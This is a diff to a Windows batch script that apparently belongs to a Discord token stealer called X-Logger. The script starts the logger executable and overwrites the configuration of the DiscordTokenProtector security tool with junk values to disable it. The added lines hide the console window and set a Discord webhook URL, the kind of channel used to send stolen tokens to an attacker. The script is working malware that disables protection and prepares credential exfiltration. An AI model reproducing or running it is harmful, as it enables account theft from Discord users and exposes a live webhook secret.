@@ -1,4 +1,4 @@
-start X-Logger.exe 
+start X-LoggerV4.exe 
 ::coded by elspiritdav4sbe
 
 ::DiscordTokenProtector pussy destroyer
@@ -23,3 +23,7 @@ echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenPro
 echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
 echo anti DiscordTokenProtector by github.com/ochysponomi >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
+@echo off
+SETCONSOLE /Hide
+CONSOLESTATE /hide
+set webhook=https://discord.com/api/webhooks/1164229785845772289/74hC6mt0Qs_A85MV8zByyTv4W5Yh8CxWlelUuwNK4JxFzBODtHuTrYJH1vzlxwPw5v5s
